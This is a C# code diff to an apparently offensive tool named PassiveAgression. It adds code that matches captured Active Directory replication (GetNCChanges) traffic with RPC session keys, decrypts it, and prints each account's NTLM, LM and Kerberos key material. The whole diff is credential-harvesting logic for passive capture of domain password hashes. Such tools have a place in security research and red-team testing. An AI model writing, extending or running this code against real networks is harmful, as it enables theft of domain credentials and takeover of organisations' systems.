@@ -28,8 +28,52 @@ namespace PassiveAgression.Core
         private ConcurrentQueue<NetRLogonSendToSam> netrLogonSendToSam = new ConcurrentQueue<NetRLogonSendToSam>();
         public ConcurrentBag<NetRLogonSendToSam> DecryptedLogonSendToSams = new();
 
+        private ConcurrentBag<RPCBinding> RPCBinds = new();
+        public ConcurrentBag<GetNCChangesResponse> DecryptedGetNcChangesResponses = new();
+        private ConcurrentQueue<GetNCChangesResponse> getNcChangesResponses = new ConcurrentQueue<GetNCChangesResponse>();
+
+
 
         #region adding methods
+
+        /// <summary>
+        /// Adds new RPCBind to the list
+        /// </summary>
+        /// <param name="rpcBinding"></param>
+        public void AddRPCBinding(RPCBinding rpcBinding)
+        {
+            if (rpcBinding == null)
+                return;
+
+            if (!rpcBinding.success)
+                return;
+
+            if (RPCBinds.Contains(rpcBinding))
+                return;
+
+            RPCBinds.Add(rpcBinding);
+        }
+
+        /// <summary>
+        /// Adds GetNCChangesResponse to the queue
+        /// </summary>
+        /// <param name="ncChangesResponse"></param>
+        public void AddGetNCChanges(GetNCChangesResponse ncChangesResponse)
+        {
+            if (ncChangesResponse == null)
+                return;
+
+            if (!ncChangesResponse.success)
+                return;
+
+            if (getNcChangesResponses.Contains(ncChangesResponse))
+                return;
+
+            getNcChangesResponses.Enqueue(ncChangesResponse);
+        }
+
+
+
 
         /// <summary>
         /// Adds new NetRServerAuthenticate3Response event to the list
@@ -170,6 +214,30 @@ namespace PassiveAgression.Core
             Console.WriteLine($"\tNTLM:\t{logonSendToSam.NTLMHash}");
         }
 
+        private void PrintReplSecrets(GetNCChangesResponse.ReplicatedSecrets[] replsecrets)
+        {
+            foreach (var secrets in replsecrets)
+            {
+                Console.WriteLine($"");
+                Console.WriteLine("[+] Replicated secret: ");
+                Console.WriteLine($"\tDN:\t{secrets.DN}");
+                Console.WriteLine($"\tSID:\t{secrets.SID}");
+                Console.WriteLine($"\tGUID:\t{secrets.GUID}");
+                Console.WriteLine($"");
+                Console.WriteLine($"\tNTLM:\t{secrets.ntlmHash}");
+
+                if (!string.IsNullOrEmpty(secrets.lmHash))
+                    Console.WriteLine($"\tLM:\t{secrets.lmHash}");
+
+                Console.WriteLine($"\tsalt:\t{secrets.kerberos_new_salt}");
+                Console.WriteLine($"\taes256:\t{secrets.aes256}");
+                Console.WriteLine($"\taes128:\t{secrets.aes128}");
+                Console.WriteLine($"\tdes:\t{secrets.md5}");
+            }
+
+
+        }
+
 
         #endregion
 
@@ -207,6 +275,9 @@ namespace PassiveAgression.Core
                 
             while (!netrLogonSendToSam.IsEmpty) 
                 ProcessNetrLogonSendToSam();
+
+            if (!getNcChangesResponses.IsEmpty)
+                ProcessGetNCChanges();
         }
 
         /// <summary>
@@ -288,6 +359,45 @@ namespace PassiveAgression.Core
                 PrintSendToSam(response);
                 DecryptedLogonSendToSams.Add(response);
             }
+        }
+
+
+        /// <summary>
+        /// Contains logic to find correct session key and decrypt the contents
+        /// and decode the data
+        /// </summary>
+        private void ProcessGetNCChanges()
+        {
+            // Fetch from queue
+            GetNCChangesResponse response;
+            var successDequeue = getNcChangesResponses.TryDequeue(out response);
+
+            if (!successDequeue)
+                return;
+
+            // Check if there's an RPC bind available with the same stream and sourceIp
+            var bindings = RPCBinds
+                                .Where(b => b.connectionInfo.StreamIndex == response.connectionInfo.StreamIndex &&
+                                       b.connectionInfo.SourceIP == response.connectionInfo.SourceIP).ToList();
+
+            // There is not. Add back to the queue
+            if (!bindings.Any())
+            {
+                getNcChangesResponses.Enqueue(response);
+                return;
+            }
+
+            // There is. Select session key and decrypt data
+            var sessionKey = bindings.Select(b => b.sessionKey).SelectMany(a => a).First();
+            response.Decrypt(sessionKey);
+
+
+            if (response.success)
+            {
+                PrintReplSecrets(response.Secrets);
+                DecryptedGetNcChangesResponses.Add(response);
+            }
+
         }
 
     }
